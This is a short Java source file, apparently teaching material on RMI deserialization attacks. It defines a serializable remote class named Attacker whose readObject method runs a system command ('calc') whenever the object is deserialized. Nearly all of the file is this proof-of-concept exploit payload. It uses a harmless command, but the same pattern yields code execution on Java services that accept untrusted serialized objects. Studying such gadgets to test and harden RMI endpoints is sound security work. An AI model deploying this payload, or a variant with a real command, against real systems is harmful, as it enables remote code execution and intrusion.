package basics.rmi.attack;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.rmi.Remote;

/**
 * @author baB_hyf
 * @date 2021/03/28
 */
public class Attacker implements Serializable, Remote {

    static final long serialVersionUID = 1L;

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        System.out.println("deserializable attack server");
        Runtime.getRuntime().exec("calc");
    }
}
